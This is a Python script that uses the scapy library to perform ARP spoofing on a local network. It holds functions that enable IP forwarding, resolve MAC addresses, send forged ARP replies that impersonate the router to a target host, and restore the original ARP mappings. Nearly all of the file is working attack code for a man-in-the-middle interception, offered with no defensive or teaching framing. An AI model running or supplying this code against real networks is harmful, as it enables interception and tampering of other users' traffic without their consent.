import sys
import time
import os
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
#from getmac import get_mac_address

def enable_linux_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as file:
        if file.read() == 1:
            return
    with open(file_path, 'w') as file:
        print(1, file=file)

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=ip), timeout=3, verbose=False)
    if ans:
        return ans[0][1].src

def spoofing(target_ip, router_ip, verbose=True):
    target_mac = get_mac(target_ip)
    #router_mac = get_mac(router_ip)

    arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, router_ip, self_mac)) 

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)

    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))












